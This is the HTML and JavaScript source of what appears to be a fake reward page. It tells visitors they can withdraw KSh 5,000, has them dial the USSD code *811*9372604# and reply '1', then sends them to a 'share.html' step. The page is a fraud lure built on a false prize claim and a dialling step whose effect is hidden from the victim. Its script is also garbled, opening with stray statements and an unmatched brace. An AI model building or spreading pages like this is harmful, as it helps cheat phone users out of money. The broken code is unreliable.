<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Activate Your Reward</title>

<link href="https://fonts.googleapis.com/css2?family=Patrick+Hand&display=swap" rel="stylesheet">
<link rel="stylesheet" href="style.css">
</head>

<body>

<div class="container">

    <div class="card winner">

        <div class="icon">🏆</div>

        <h1>✅ Congratulations!</h1>

        <p>You've qualified for withdrawal.</p>

        <h2>Your withdrawal request for <strong>KSh 5,000</strong> has been received.</h2>

    </div>

    <div class="card step">

        <h3>Step 1 of 3: Activate Your Reward</h3>

        <p>
            <strong>1.</strong> Tap <strong>Dial Code Now</strong>.<br><br>

            <strong>2.</strong> Reply with <strong>1</strong> on the USSD menu.<br><br>

            <strong>3.</strong> Return here and tap <strong>I've Completed This Step</strong>.
        </p>

        <button id="dialBtn" onclick="dialNow()">
    📞 Dial Code Now
</button>

        <p id="dialStatus" style="margin-top:15px;color:#555;">
            Complete the USSD process, then continue.
        </p>

        <button id="continueBtn" onclick="completeDial()" style="margin-top:15px;">
            ✅ I've Completed This Step
        </button>

    </div>

</div>

<script>
localStorage.setItem("dialCompleted","true");

alert(localStorage.getItem("dialCompleted"));

window.location.href="share.html"; 
}
let dialClicks = Number(localStorage.getItem("dialClicks")) || 0;


function dialNow(){

    if(dialClicks < 3){

       dialClicks++;

localStorage.setItem("dialClicks", dialClicks);

        document.getElementById("dialStatus").innerHTML =
        "Complete the USSD process and reply with 1. Attempt " + dialClicks + " of 3.";

        window.location.href="tel:*811*9372604%23";

    } else {

        document.getElementById("dialBtn").disabled = true;

        document.getElementById("dialBtn").innerHTML =
        "✅ Dial Completed";

        alert("You have completed the Dial Code step.");

    }

}


function completeDial(){

    if(dialClicks === 0){

        alert("Please tap Dial Code Now first.");

        return;

    }

    localStorage.setItem("dialCompleted","true");

// Reset dial clicks for the next application
localStorage.removeItem("dialClicks");

window.location.href="share.html";

}

</script> 

</body>
</html>
